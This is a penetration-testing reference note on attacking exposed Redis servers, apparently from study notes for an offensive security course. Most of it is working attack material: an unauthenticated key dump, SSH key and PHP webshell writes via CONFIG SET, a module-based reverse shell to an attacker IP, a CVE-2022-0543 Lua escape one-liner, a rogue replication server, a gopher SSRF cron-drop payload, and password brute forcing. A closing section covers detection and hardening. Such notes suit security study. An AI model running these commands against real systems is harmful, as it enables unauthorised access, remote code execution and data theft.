# Redis

#Redis #database #inmemory #nosql

## What is Redis?
Remote Dictionary Server — open-source in-memory data structure store. Used as database, cache, and message broker. No authentication by default in older versions. Runs as root in many deployments.

- Port: **TCP 6379** (default), **TCP 6380** (TLS)
- Config file: `/etc/redis/redis.conf` or `/etc/redis.conf`
- Default bind: `127.0.0.1` (modern), `0.0.0.0` (older/misconfigured)
- Speaks a **plaintext line protocol (RESP)** — you can drive it with raw `printf`/`nc`, which is why it's a favourite SSRF/gopher target (see below).

> [!warning] **Redis 7.0 hardened the classic RCE paths — check your version first.** The famous "`CONFIG SET dir` → write SSH key / webshell" and "`MODULE LOAD` .so" techniques are **disabled by default on Redis 7.0+**: `dir`/`dbfilename` became *protected configs* (`enable-protected-configs no`) and `MODULE` needs `enable-module-command`. Verified live on Redis 8.0.6 — both return `ERR … can't set protected config` / `ERR MODULE command not allowed`. They only work on **Redis < 7**, or where an admin explicitly set `enable-protected-configs yes` / `enable-module-command yes`. On patched-but-vulnerable-distro builds, the **Lua sandbox escape (CVE-2022-0543)** is the RCE that still lands — see Attack Vectors.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Database/redis-cli\|redis-cli]] | The native client — connect, enumerate, run every primitive below |
| [[Tools/Scanning/NMAP\|NMAP]] | Fingerprint + version (`redis-info`), brute (`redis-brute`) |
| [[Tools/Auth/Hydra\|Hydra]] | Online password brute force (`redis://`) |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `redis_server`, `redis_login` scanner modules |

External PoCs referenced below (no vault note — upstream repos): `RedisModules-ExecuteCommand` (module RCE), `redis-rogue-server` (replication RCE).

---

## Enumeration

```bash
# Nmap
nmap -p 6379 --script redis-info -sV <target>

# Check if open + unauthenticated
redis-cli -h <target> ping

# Metasploit
use auxiliary/scanner/redis/redis_server
```

---

## Connect / Access

```bash
# Connect (no auth)
redis-cli -h <target>

# Connect with password
redis-cli -h <target> -a <password>
redis-cli -h <target> -p 6379

# Authenticate after connecting
AUTH <password>

# Redis 6+ uses ACL users — the default user may be nopass while named users are locked down,
# or vice-versa. Authenticate as a named user:
AUTH <username> <password>
```

### Authentication & ACLs (Redis 6+)

Redis 6 replaced the single `requirepass` with an ACL system (multiple users, per-command/-key permissions). Enumerate what your connection can actually do — a `default` user with `nopass` but limited command rights is common:

```bash
ACL WHOAMI               # who am I
ACL LIST                 # all users + rules (needs perms)
ACL CAT                  # command categories
ACL GETUSER default      # what the default user can run — look for +@all / +config / +eval
```

If `ACL GETUSER` shows `+@all` (or `+config`/`+eval`) you have the RCE surface; a narrowly-scoped user drops you to data-loot only — same "which privileges do I hold?" fork as PostgreSQL.

---

## Key Commands

```bash
# Server info
INFO
INFO server
INFO keyspace

# Config
CONFIG GET *
CONFIG GET dir
CONFIG GET dbfilename
CONFIG GET requirepass

# Key operations
KEYS *
KEYS user*
TYPE <key>
GET <key>
SET <key> <value>
HGETALL <key>    # hash
LRANGE <key> 0 -1  # list
SMEMBERS <key>   # set

# Database
SELECT 0         # switch to db 0 (0-15)
DBSIZE
FLUSHDB          # clear current db
FLUSHALL         # clear all dbs

# Save
BGSAVE
SAVE
LASTSAVE
```

---

## Attack Vectors

### Unauthenticated Access — Data Dump

```bash
redis-cli -h <target> KEYS '*'
redis-cli -h <target> GET <key>

# Dump all keys and values
redis-cli -h <target> --scan | while read key; do echo "=== $key ==="; redis-cli -h <target> GET "$key"; done
```

### Write SSH Authorized Keys

> [!warning] **Redis < 7 only (or `enable-protected-configs yes`).** On Redis 7+, `CONFIG SET dir`/`dbfilename` are protected and this fails with `ERR … can't set protected config`. Check `redis-cli INFO server | grep redis_version` before relying on it.

```bash
# Requires: Redis running as root or redis user with homedir, writable .ssh/
redis-cli -h <target>

# Set key value to our SSH public key
SET payload "\n\nssh-rsa AAAAB3NzaC1yc2E... attacker@kali\n\n"

# Configure Redis to save to SSH directory
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
BGSAVE
```

### Write Web Shell

```bash
redis-cli -h <target>

SET webshell "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
BGSAVE
```

### RCE via Redis Modules (RedisModules-ExecuteCommand)

> [!warning] **Redis 7+ blocks `MODULE LOAD` by default** (`enable-module-command no` — verified `ERR MODULE command not allowed` on 8.0.6). Works on Redis < 7, or where the admin set `enable-module-command yes`/`local`. If blocked, fall back to the Lua sandbox escape below.

```bash
# Requires write access + ability to MODULE LOAD
# Build: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
# Transfer module.so to target or via SMB share, then:
MODULE LOAD /path/to/module.so
system.exec "id"
system.rev <attacker_ip> <port>
```

### RCE via Lua Sandbox Escape (CVE-2022-0543)

The RCE that survives Redis 7+ hardening. **Debian/Ubuntu-packaged Redis** (and Docker images built on them) shipped Lua as a shared library that left the `package` global reachable inside `EVAL`, so a scripted call to `package.loadlib` breaks out of the sandbox and runs OS commands — no `CONFIG SET`, no `MODULE LOAD` needed. Only requires the ability to run `EVAL` (available to any authenticated/unauth client that can issue commands).

```bash
redis-cli -h <target> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

Patched in Redis 6.0.16 / 6.2.7 / 7.0.0 and in the distro packages. If `EVAL` errors that scripting is disabled, the target set `enable-debug-command`/scripting restrictions or is patched.

### Master/Slave Replication RCE (Redis 4.x/5.x)

```bash
# rogue-server: https://github.com/n0b0dyCN/redis-rogue-server
python3 redis-rogue-server.py --rhost <target> --lhost <attacker>
```

### SSRF → Redis (gopher)

Because Redis speaks a newline-delimited plaintext protocol and (pre-7) accepts inline commands, a server-side request forgery that reaches an internal Redis often becomes RCE. Smuggle multi-line RESP through a `gopher://` URL (each command CRLF-separated); the classic chain is `SET`+`CONFIG SET dir`+`BGSAVE` to drop a cron job or webshell on Redis < 7.

```
gopher://127.0.0.1:6379/_%0d%0aSET%20x%20"<payload>"%0d%0aCONFIG%20SET%20dir%20/var/spool/cron%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSAVE%0d%0a
```

Use `Gopherus` (external tool, `github.com/tarunkant/Gopherus` — unmaintained Python 2) to generate the encoded string. Same Redis-7 protected-config caveat applies — on 7+ pivot to the Lua escape instead.

### Brute Force

```bash
hydra -P /usr/share/wordlists/rockyou.txt redis://<target>

# Metasploit
use auxiliary/scanner/redis/redis_login
```

---

## Detection & Artefacts

- **`CONFIG SET dir` / `CONFIG SET dbfilename`** appear in the Redis log and, on 7+, produce the `can't set protected config` error — repeated attempts are a strong IOC of the SSH-key/webshell technique.
- **`MODULE LOAD`** and **`SLAVEOF`/`REPLICAOF`** to an external host are abnormal for a cache — the replication-RCE chain shows a rogue master in `INFO replication`.
- **`EVAL` with `package.loadlib`** is the CVE-2022-0543 signature; scripting is rarely used by real apps against a cache.
- A `BGSAVE`/`SAVE` right after a `SET` of base64/`<?php`-looking data, or an RDB written outside the normal data dir, is the file-drop tell. On the host, a webshell or `authorized_keys` owned by the `redis` user is the artefact.
- Enable `requirepass`/ACLs, `protected-mode yes`, run as non-root with a dedicated data dir, and leave `enable-protected-configs`/`enable-module-command` at `no`.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No `requirepass` / `default` user `nopass` | Unauthenticated access to all data |
| `bind 0.0.0.0` | Exposed to network |
| Running as root | SSH key write = root shell |
| Writable web dir | Web shell via CONFIG SET (Redis < 7) |
| `protected-mode no` | Auth bypass when no password + external bind |
| `enable-protected-configs yes` (Redis 7+) | Re-enables `CONFIG SET dir`/`dbfilename` → SSH/webshell writes |
| `enable-module-command yes/local` (Redis 7+) | Re-enables `MODULE LOAD` → module RCE |
| Debian/Ubuntu build < 6.0.16/6.2.7/7.0 | Lua sandbox escape RCE (CVE-2022-0543) even with configs locked |
| ACL user with `+@all`/`+config`/`+eval` | Full RCE surface for a supposedly-scoped account |

---

## Quick Reference

| Goal | Command |
|---|---|
| Check if open | `redis-cli -h host ping` |
| Connect | `redis-cli -h host` |
| Dump all keys | `redis-cli -h host KEYS '*'` |
| Server info | `redis-cli -h host INFO` |
| Get config | `redis-cli -h host CONFIG GET *` |
| My ACL/version | `redis-cli -h host ACL WHOAMI` · `INFO server \| grep redis_version` |
| Write SSH key (Redis <7) | `CONFIG SET dir /root/.ssh` → `BGSAVE` |
| Write web shell (Redis <7) | `CONFIG SET dir /var/www/html` → `BGSAVE` |
| RCE (Lua, CVE-2022-0543) | `redis-cli eval '... package.loadlib ... io.popen("id") ...' 0` |
| Nmap enum | `nmap -p 6379 --script redis-info host` |

---

> [!note] **See also** — sibling unauthenticated data stores [[Services/Database Services/Elasticsearch|Elasticsearch]] and [[Services/Database Services/MongoDB|MongoDB]] — same "open port → full dump" pattern. SSRF-driven Redis abuse is covered from the web side in [[Class notes/HTB Academy/CWES Claude/Server-Side Attacks|Server-Side Attacks]] (gopher/SSRF).

---

*Created: 2026-07-13*
*Updated: 2026-09-22*
*Model: claude-opus-4-8*
